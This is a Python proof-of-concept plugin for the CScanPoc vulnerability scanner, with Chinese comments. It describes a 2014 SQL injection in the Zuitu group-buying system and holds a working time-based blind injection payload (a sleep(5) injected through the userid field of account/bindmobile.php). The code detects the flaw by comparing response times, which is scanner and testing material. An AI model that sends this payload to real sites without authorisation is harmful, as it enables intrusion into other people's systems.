# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Zuitu_0002'  # 平台漏洞编号，留空
    name = '最土团购 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-23'  # 漏洞公布时间
    desc = '''
        最土团购系统是国内最专业、功能最强大的GroupOn模式的免费开源团购系统平台，专业技术团队、完美用户体验与极佳的性能，立足为用户提供最值得信赖的免费开源网上团购系统。
        最土团购，在include/library/DB.class.php(128-134):
        发现传递进来的参数，进行处理后变为$idstring ，在此期间 只是做了空格检测，并没有做其他特殊字符的过滤，然后直接进入查询，故而导致sql注入。
        辐射的文件有：

        account/bindmobile.php
        ajax/chargecard.php
        ajax/coupon.php
        api/call.php
        ......。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1884/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3b17765-fe44-41a8-88c9-f4c06097de72'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/account/bindmobile.php'
            data_sleep = "userid=sssssssssssssssssssss',sleep(5))#"
            data_normal = "userid=sssssssssssssssssssss',1)#"
            url = self.target + payload
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
